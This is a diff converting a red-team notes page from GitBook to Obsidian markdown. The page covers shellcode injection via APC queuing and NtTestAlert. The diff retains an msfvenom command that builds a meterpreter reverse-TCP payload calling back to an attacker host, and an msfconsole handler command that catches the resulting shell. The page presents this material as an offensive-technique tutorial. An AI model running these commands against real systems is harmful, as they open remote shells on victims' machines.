@@ -18,34 +18,32 @@ The flow of the technique is simple:
 
 Lets's generate the meterpreter shellcode first:
 
-{% code title="attacker@kali" %}
 ```csharp
+// attacker@kali
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Annotation 2019-05-27 191650.png>)
+![[Annotation 2019-05-27 191650.png]]
 
 Short code that performs `NtTestAlert` function address resolution, memory allocation, shellcode writing to memory, APC queuing and `NtTestAlert` call:
 
-![](<../../.gitbook/assets/Annotation 2019-05-27 192952.png>)
+![[Annotation 2019-05-27 192952.png]]
 
 Now, set up a multi handler for catching the incoming meterpreter connection:
 
-{% code title="attacker@kali" %}
 ```csharp
+// attacker@kali
 msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/x64/meterpreter/reverse_tcp; exploit"
 ```
-{% endcode %}
 
 Below shows the technique in action, resulting in a meterpreter shell:
 
-![](../../.gitbook/assets/apc-local.gif)
+![[apc-local.gif]]
 
 ## Code
 
-{% code title="local-apc.cpp" %}
 ```cpp
+// local-apc.cpp
 #include "pch.h"
 #include <Windows.h>
 
@@ -68,10 +66,9 @@ int main()
 	return 0;
 }
 ```
-{% endcode %}
 
 ## Reference
 
-{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtTestAlert.html" %}
+[undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtTestAlert.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtTestAlert.html)
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc" %}
+[docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
